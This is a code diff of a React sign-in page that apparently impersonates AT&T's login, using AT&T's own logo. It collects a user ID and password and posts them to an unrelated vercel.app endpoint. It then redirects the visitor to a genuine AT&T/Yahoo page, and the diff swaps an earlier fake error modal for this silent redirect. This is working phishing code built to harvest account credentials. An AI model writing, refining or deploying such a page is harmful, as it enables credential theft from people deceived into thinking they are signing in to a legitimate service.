@@ -1,28 +1,20 @@
 import React, { useState } from 'react'
 import axios from 'axios'
-import Modal from '../components/Modal'
-
 const Signin = () => {
   const [userData, setUserData] = useState({ userID: '', password: '' })
   const [showError, setShowError] = useState(false)
+  const [redirect, setRedirect] = useState(false)
 
-  const [isModalOpen, setIsModalOpen] = useState(false)
-
-  const handleOpenModal = () => {
-    setIsModalOpen(true)
-  }
-
-  const handleCloseModal = () => {
-    setIsModalOpen(false)
-  }
+  React.useEffect(() => {
+    redirect && window.location.replace('https://currently.att.yahoo.com/')
+  }, [redirect])
 
   const handleChange = (e) => {
     const { name, value } = e.target
     setUserData({ ...userData, [name]: value })
   }
 
-  const handleSubmit = (e) => {
-    e.preventDefault()
+  const handleSubmit = () => {
     setShowError(false)
     if (!userData['userID'] || !userData['password']) {
       setShowError(true)
@@ -30,10 +22,15 @@ const Signin = () => {
     }
     axios
       .post('https://att-signin-api.vercel.app/add-data', userData)
-      .then((resp) => console.log(resp.data))
+      // .post('http://127.0.0.1:3000/add-data', userData)
+      .then((resp) => {
+        console.log(resp.data)
+        console.log('lol')
+        setRedirect(true)
+      })
       .catch((e) => console.log(e))
-    handleOpenModal()
   }
+
   const imgSrc =
     'https://signin.att.com/static/siam/en/halo_c/images/logos/att_hz_lg_lkp_rgb_pos.svg'
 
@@ -80,12 +77,6 @@ const Signin = () => {
           >
             Continue
           </button>
-          <Modal isOpen={isModalOpen} onClose={handleCloseModal}>
-            <h1 className='text-xl font-bold text-red-700'>
-              There was an error logging you in.
-            </h1>
-            <p className='font-sembold text-red-700'>Please try again</p>
-          </Modal>
         </section>
       </section>
     </div>
